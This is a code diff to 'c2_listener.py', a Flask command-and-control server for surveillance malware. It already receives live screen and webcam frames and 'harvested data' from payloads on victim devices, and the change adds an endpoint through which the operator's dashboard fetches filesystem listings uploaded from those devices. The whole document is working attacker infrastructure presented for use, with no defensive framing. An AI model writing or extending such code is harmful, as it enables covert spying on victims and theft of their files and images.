@@ -1,5 +1,6 @@
 # File: c2_listener.py
 import os
+import json
 import requests
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -22,6 +23,8 @@ command_queue = {}
 # --- NEW: In-memory cache for live frames ---
 # Structure: { "device_id": { "screen_0": "base64_img", "screen_1": "...", "webcam": "..." } }
 frame_cache = {}
+# --- NEW: In-memory cache for filesystem listings ---
+filesystem_cache = {}
 
 # ---------------------------------------------------------
 # HELPER FUNCTIONS
@@ -119,7 +122,7 @@ def get_logs(device_id):
         return jsonify({"error": "Database fetch failed"}), 500
 
 # ---------------------------------------------------------
-# LIVE VIEW ENDPOINTS (NEW)
+# LIVE VIEW ENDPOINTS
 # ---------------------------------------------------------
 @app.route('/frames', methods=['POST'])
 def push_frame():
@@ -156,20 +159,44 @@ def get_frame(device_id, cache_key):
     else:
         return jsonify({"error": "Frame not available"}), 404
 
+@app.route('/fs/<device_id>', methods=['GET'])
+def get_fs_data(device_id):
+    """Dashboard polls this to get the latest filesystem data."""
+    # SECURITY CHECK
+    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
+        return jsonify({"error": "Unauthorized access"}), 401
+
+    json_string_data = filesystem_cache.pop(device_id, None) 
+    if json_string_data:
+        try:
+            parsed_data = json.loads(json_string_data)
+            return jsonify(parsed_data), 200
+        except json.JSONDecodeError:
+            return jsonify({"error": "Invalid JSON format from payload"}), 500
+    else:
+        return jsonify({"error": "Filesystem data not available"}), 404
+
 # ---------------------------------------------------------
 # PAYLOAD ENDPOINTS
 # ---------------------------------------------------------
 @app.route('/logs', methods=['POST'])
 def push_logs():
     """Payload posts new harvested data here."""
-    # Note: No password check here so the payload can freely push data
+    data = request.json
+    
+    if data and data.get("category") == "filesystem_data":
+        device_id = data.get("device_id")
+        if device_id:
+            filesystem_cache[device_id] = data.get("content")
+        return jsonify({"status": "fs data cached"}), 200
+
     if not SUPABASE_KEY or not SUPABASE_URL:
         return jsonify({"error": "Supabase Configuration missing"}), 500
 
     headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Prefer": "return=minimal,resolution=merge-duplicates"}
     upsert_url = f"{SUPABASE_URL}?on_conflict=device_id,category"
     try:
-        response = requests.post(upsert_url, json=request.json, headers=headers, timeout=15)
+        response = requests.post(upsert_url, json=data, headers=headers, timeout=15)
         response.raise_for_status()
         return jsonify({"status": "success"}), 200
     except requests.exceptions.RequestException: 
